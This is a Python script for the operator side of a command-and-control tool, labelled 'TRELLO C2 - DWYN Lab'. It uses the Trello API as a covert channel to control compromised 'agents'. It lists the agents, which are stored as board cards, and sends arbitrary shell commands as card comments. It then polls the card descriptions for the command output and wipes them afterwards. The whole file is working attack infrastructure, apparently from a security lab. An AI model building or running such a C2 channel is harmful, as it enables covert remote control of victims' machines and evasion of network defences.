#!/usr/bin/env python3

import requests as req 

TRELLO_APIKEY = "XXX" 
TRELLO_APITOKEN = "XXX"

# To Simplyfy URL
def trello_urlformatting(url_request):
	API_URL = f"https://api.trello.com/1/{url_request}?key={TRELLO_APIKEY}&token={TRELLO_APITOKEN}"
	return API_URL

# Send Command to specific agent with card_id perimeter
def send_cmdcommand(card_id,cmd):
	url_labels = trello_urlformatting(f"cards/{card_id}/actions/comments")
	post_label = {"text":f"pending_executed:{cmd}"}
	send_commandget = req.post(url_labels,data=post_label)
	json_result_label = send_commandget.json()
	output_command = ""
	executed_command = False
	while not executed_command:
		request_card = req.get(trello_urlformatting(f"cards/{card_id}"))
		json_result = request_card.json()
		output_command = json_result['desc']
		if "lntc_command_result:" in output_command:
			executed_command = True
	final_result_command = output_command.replace("lntc_command_result:","")
	print(final_result_command)
	change_desc = {"desc":""}
	req.put(trello_urlformatting(f"cards/{card_id}"),params=change_desc)

def get_allagents():
	request_allagents = req.get(trello_urlformatting("boards/AKjXfm2f/cards"))
	list_all_agents = request_allagents.json()
	for x in list_all_agents:
		print(f"- ID Agent : {x['id']}, Agent {x['name']}")


request_allagents = req.get(trello_urlformatting("boards/AKjXfm2f/cards"))
list_allagents = request_allagents.json()

print("""
######################
#TRELLO C2 - DWYN Lab#
######################
	""")


get_allagents()

print("Choose Your Agent ID")
choose_agent = ""
choose_agent = input("agent_id>")

while True:
	input_command = input(f"{choose_agent} - cmd> ")
	if input_command == "help":
		print("""
- list_agents : List All Registered Agents
- change_agent : Change Agent
- To Execute Command just Type command what you want
			""")
	elif input_command == "list_agents":
		get_allagents()
	elif input_command == "change_agent":
		choose_agent = input("agent_id>")
	else:
		send_cmdcommand(choose_agent,input_command)
